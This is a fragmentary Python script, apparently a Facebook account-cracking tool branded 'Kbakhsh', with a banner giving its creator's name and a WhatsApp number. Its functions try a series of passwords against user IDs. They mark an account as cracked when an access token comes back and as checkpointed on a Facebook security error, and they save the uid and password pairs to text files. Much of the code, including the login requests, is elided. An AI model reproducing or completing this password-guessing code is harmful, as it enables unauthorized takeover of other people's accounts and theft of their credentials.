...
\033[1;92m{~} \033[0;96mCreator > \x1b[1;91mTOR UBAID

\033[1;92m{~} \033[0;96mWhatsapp > \x1b[1;91m03119184509

\033[1;92m{~} \033[0;96mGithub > \x1b[1;91mhttps://github.com/******
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;32m [Kbakhsh-OK] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("kbakhsh.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;33m [Kbakhsh-CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("kbakhshcp.txt", "a")
					...
					if "access_token" in q:
						...
						print(" \033[1;32m [Kbakhsh-OK] "+uid+" | "+pass2+"\033[0;97m")

						ok = open("kbakhshok.txt", "a")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;33m [Kbakhsh-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;32m [Kbakhsh-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;33m [Kbakhsh-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;32m [Kbakhsh-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;33m [Kbakhsh-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;32m [Kbakhsh-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;33m [Kbakhsh-CP] "+uid+" | "+pass5+"\033[0;97m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;32m[Kbakhsh-OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					if "access_token" in q:
						...
						print(" \033[1;32m[Kbakhsh-OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;33m [Kbakhsh-CP] "+k+co+user+" | "+pass3+"\033[0;97m")
